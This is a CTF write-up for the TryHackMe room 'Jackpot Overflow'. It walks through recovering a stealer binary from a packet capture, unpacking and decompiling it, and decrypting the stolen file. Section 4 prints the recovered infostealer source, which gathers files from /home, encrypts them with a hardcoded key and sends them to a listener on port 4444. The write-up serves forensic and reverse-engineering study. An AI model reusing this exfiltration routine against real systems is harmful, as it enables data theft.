**Room:** [TryHackMe — CTF: Jackpot Overflow](https://tryhackme.com/room/thm-ctf-jackpot-overflow)

**Category:** Network Forensics / Reverse Engineering **Challenge file:** `stolen_jackpot.pcapng` **Flag:** _submitted on TryHackMe — omitted here_

## 1. Initial Triage

The provided archive contained a single packet capture, `stolen_jackpot.pcapng` (701 packets). Loading it with Scapy and grouping packets by TCP port pairs revealed a handful of conversations:

|Ports (src, dst)|Packets|Notes|
|---|---|---|
|8080 ↔ 60102|398 / 209|Large HTTP transfer, ~20 MB|
|8080 ↔ 47808 / 47820 / 34450|6 each|Short HTTP probes (`GET /admin`, `/cms`, `/flag` — all 404)|
|4444 ↔ 49496 / 49500|short|Raw TCP, small payloads|

The `/admin`, `/cms`, and `/flag` requests were red herrings/reconnaissance noise — all returned `404 File not found` from a Python `SimpleHTTP/0.6` server.

## 2. Recovering the Downloaded Binary

The large stream on port 8080 ↔ 60102 was an HTTP response to:

```
GET /stealer HTTP/1.1
Host: TARGET:8080
User-Agent: Wget/1.21.2
```

The response body (after stripping HTTP headers) was a ~20.5 MB **ELF 64-bit executable**. I reassembled the TCP stream, split off the HTTP payload, and saved it as `stealer_elf`:

```python
from scapy.all import *
pkts = rdpcap("stolen_jackpot.pcapng")
data = b"".join(bytes(p[Raw].load) for p in pkts
                 if p.haslayer(TCP) and p.haslayer(Raw)
                 and p[TCP].sport == 8080 and p[TCP].dport == 60102)
body = data[data.find(b"\r\n\r\n")+4:]
open("stealer_elf", "wb").write(body)
```

```
$ file stealer_elf
stealer_elf: ELF 64-bit LSB executable, x86-64, ... stripped
```

## 3. Unpacking the Binary

Strings inside the binary (`PyRun_SimpleStringFlags`, `Crypto.Cipher.AES`, `keyring.backends`, etc.) indicated this was a **PyInstaller-frozen Python executable**. I extracted it with `pyinstxtractor-ng`:

```
$ pyinstxtractor-ng stealer_elf
[+] Pyinstaller version: 2.1+
[+] Python version: 3.10
[+] Found 198 files in CArchive
[+] Found 666 files in PYZ archive
[+] Possible entry point: stealer.pyc
```

The entry point `stealer.pyc` is the malware's actual logic.

## 4. Decompiling `stealer.pyc`

Since the bytecode targeted Python 3.10 (and common decompilers like `decompyle3`/`uncompyle6` don't support 3.10), I built **pycdc** (`zrax/pycdc` on GitHub) from source, which supports newer bytecode versions:

```
$ git clone https://github.com/zrax/pycdc.git
$ cmake -B pycdc/build -DCMAKE_BUILD_TYPE=Release pycdc
$ make -C pycdc/build -j4
$ ./pycdc/build/pycdc stealer_elf_extracted/stealer.pyc
```

Recovered source:

```python
import os
import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

KEY  = b'J4ckp0tH4ck3rKey'
IV   = b'Iv_For_Exf1ltr8!'
HOST = 'TARGET'
PORT = 4444

def run():
    if socket.gethostname() != 'b0x':
        raise SystemExit
    for root, _, files in os.walk('/home'):
        for f in files:
            if f.endswith('.jackpot'):
                data = open(os.path.join(root, f), 'rb').read()
                enc = AES.new(KEY, AES.MODE_CBC, IV).encrypt(pad(data, 16))
                s = socket.socket()
                s.connect((HOST, PORT))
                s.sendall(f.encode() + b'\n' + enc)
                s.close()

run()
```

This is an infostealer: it hunts `/home` for any `*.jackpot` files, AES-128-CBC encrypts them with a **hardcoded key and IV**, and exfiltrates them over raw TCP to `TARGET:4444`.

## 5. Extracting the Exfiltrated Data

Back in the pcap, the two short raw-TCP streams to port 4444 are exactly this exfiltration traffic:

```
49496 → 4444: b'flag.jackpot\n' + 48 bytes ciphertext
49500 → 4444: b'flag.jackpot\n' + 16 bytes ciphertext  (retry/partial connection)
```

## 6. Decryption

Using the hardcoded key/IV recovered from the decompiled source:

```python
from Crypto.Cipher import AES

KEY = b'J4ckp0tH4ck3rKey'
IV  = b'Iv_For_Exf1ltr8!'

ciphertext = bytes.fromhex(
    "9bcc341f8374f7d031a5a0ee46635013"
    "13b15466b184e33a3f295efd0cd1b4f5"
    "c64b48dd831bbca7ec4423e3782f8fe5"
)

pt = AES.new(KEY, AES.MODE_CBC, IV).decrypt(ciphertext)
print(pt)
```

Output:

```
[flag omitted, followed by standard PKCS#7 padding bytes]
```

(trailing bytes are standard PKCS#7 padding, `\x10` = 16, valid since block size is 16).

## Flag

_submitted on TryHackMe — omitted here_

## Summary of Attack Chain

1. Attacker hosts a simple Python HTTP server exposing a PyInstaller-packed "stealer" binary.
2. Victim host (`wget`) downloads and (presumably) executes the binary.
3. The binary is host-locked (`gethostname() == 'b0x'`), walks `/home` for `*.jackpot` files.
4. Found files are AES-128-CBC encrypted with a key/IV baked directly into the binary.
5. Ciphertext is exfiltrated in the clear (no HTTPS/TLS) over raw TCP to a C2 listener on port 4444.
6. Because the key/IV were static and recoverable from the binary, the exfiltrated data was trivially decryptable — recovering the flag.

## Key Takeaways / Lessons

- **Hardcoded cryptographic keys are not real protection.** Any static key embedded in a binary can be extracted via reverse engineering.
- **Unencrypted exfiltration channels are trivially interceptable** — full packet capture visibility let us recover the raw ciphertext.
- **PyInstaller binaries are not real "compiled" protection** — they can be unpacked and their `.pyc` decompiled, especially for Python versions supported by modern decompilers (`pycdc` supports Python 3.10+ where `decompyle3`/`uncompyle6` fall short).
- Analysts should always check for auxiliary/side-channel traffic (like the port 4444 stream here) in addition to the primary large transfer when triaging a pcap.

## Tools Used

- `scapy` — pcap parsing, TCP stream reassembly
- `pyinstxtractor-ng` — PyInstaller archive extraction
- `pycdc` (built from source) — Python 3.10 bytecode decompilation
- `pycryptodome` — AES decryption